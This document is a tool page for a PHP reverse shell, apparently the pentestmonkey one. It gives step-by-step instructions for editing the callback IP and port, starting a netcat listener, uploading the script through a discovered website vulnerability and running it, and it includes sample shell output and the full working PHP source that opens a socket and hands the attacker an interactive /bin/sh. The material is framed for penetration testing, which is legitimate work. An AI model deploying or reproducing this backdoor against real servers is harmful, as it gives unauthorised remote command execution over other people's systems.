# This is a tool from pentest monkeys!

[Walkthrough](#Walkthrough)
[FAQ](#FAQ)
[Caveats](#Caveats)


## Walk Through
Modify the source

To prevent someone else from abusing your backdoor – a nightmare scenario while pentesting – you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:

~~~
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
~~~

### Get Ready to catch the reverse shell

Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):
~~~
$ nc -v -n -l -p 1234
~~~
### Upload and Run the script

Using whatever vulnerability you’ve discovered in the website, upload php-reverse-shell.php.  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won’t see any output on the web page, it’ll just hang if successful):

~~~
http://somesite/php-reverse-shell.php
~~~

### Enjoy your new shell

If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:
~~~
$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
 16:59:28 up 39 days, 19:54,  2 users,  load average: 0.18, 0.13, 0.10
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:10m  0.01s /bin/sh
uid=81(apache) gid=81(apache) groups=81(apache)
sh: no job control in this shell
sh-3.2$
~~~

## FAQs

### When is this useful?

Perhaps the only areas on disk that you have write access to are mounted with the “noexec” option.  Uploading a compiled program will be of no use in these situations.  You need to use an installed scripting language like Python, PERL, PHP, etc.
Perhaps you just can’t be bothered to upload a second program.

### Isn’t the shell connection just going to be severed when the web server times out the PHP script?

No.  It doesn’t seem to on the systems that I’ve tested it on (Gentoo Linux only so far).  Additionally the PHP script attempts to daemonise itself and dissociate from the parent process to avoid this (though it rarely works in practise).  Your browser will appear to hang when you access the reverse shell.  This is normal.  It’s OK to hit cancel in your browser once you’ve got your shell.

### Isn’t there going to be a rather suspicious looking shell process when the admin runs “ps”?

Yeah.  This version of the reverse shell isn’t very subtle:
~~~
apache   28106  0.0  0.0  10428  1216 ?        S    17:15   0:00 sh -c uname -a; w; id; /bin/sh -i
apache   28110  0.0  0.0  10172  1428 ?        S    17:15   0:00 /bin/sh -i
~~~

## Caveats

Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.  Pick a port that’s allowed through Firewall.  If there are none, you’ll have to make do with a form-based PHP shell.

This particular implementation of the reverse shell is unix-based.  You’ll need to modify it before it will work on windows.

I’ve noticed a couple of zombie processes while testing this shell.  It doesn’t always happen, but is probably to be expected since we’re not daemonising ourself properly.

## Code
~~~
<?php
/
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
~~~

---
ref
http://pentestmonkey.net/tools/web-shells/php-reverse-shell


